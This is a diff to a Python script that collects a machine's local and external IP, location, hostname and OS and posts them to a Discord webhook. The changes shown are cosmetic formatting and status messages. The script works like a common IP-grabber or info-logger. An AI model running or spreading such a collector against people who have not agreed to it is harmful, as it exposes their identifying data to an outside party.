@@ -1,6 +1,7 @@
 import datetime
 import socket
 import platform
+import time
 import requests
 
 def get_ip_address():
@@ -53,7 +54,7 @@ def save_to_file(content):
         with open("skrypt_log.txt", "a") as file:
             file.write(content + "\n")
     except Exception as e:
-        print("Error in saving to file: ", e)
+        print("Error in saving to text file: ", e)
 
 def send_to_discord_webhook(webhook_url, content):
     data = {"content": content}
@@ -78,34 +79,37 @@ if __name__ == "__main__":
 
     webhook_url = "..."
 
-    log_content = "Date: " + formatted_time + "\n"
+    log_content = "**Date:** " + formatted_time + "\n"
 
     if ip:
-        log_content += "IP Address: " + ip + "\n"
+        log_content += "**IP Address: **" + ip + "\n"
     else:
-        log_content += "IP Address: NONE\n"
+        log_content += "**IP Address:** NONE\n"
 
     if external_ip:
-        log_content += "External IP: " + external_ip + "\n"
+        log_content += "**External IP: **" + external_ip + "\n"
     else:
-        log_content += "External IP: NONE\n"
+        log_content += "**External IP:** NONE\n"
 
     if location:
-        log_content += "Location: " + location + "\n"
+        log_content += "**Location: **" + location + "\n"
     else:
-        log_content += "Location: NONE\n"
+        log_content += "**Location:** NONE\n"
 
     if hostname:
-        log_content += "PC Hostname: " + hostname + "\n"
+        log_content += "**PC Hostname:** " + hostname + "\n"
     else:
-        log_content += "PC Hostname: NONE\n"
+        log_content += "**PC Hostname:** NONE\n"
 
     if os_name:
-        log_content += "OS: " + os_name + " " + os_version +"\n"
+        log_content += "**OS:** " + os_name + " " + os_version +"\n"
     else:
-        log_content += "OS: NONE\n"
-
+        log_content += "**OS:** NONE\n"
 
     print(log_content)
+    time.sleep(2)
+    print("Successfully sent to host.")
+    time.sleep(2)
+
     save_to_file(log_content)
     send_to_discord_webhook(webhook_url, log_content)
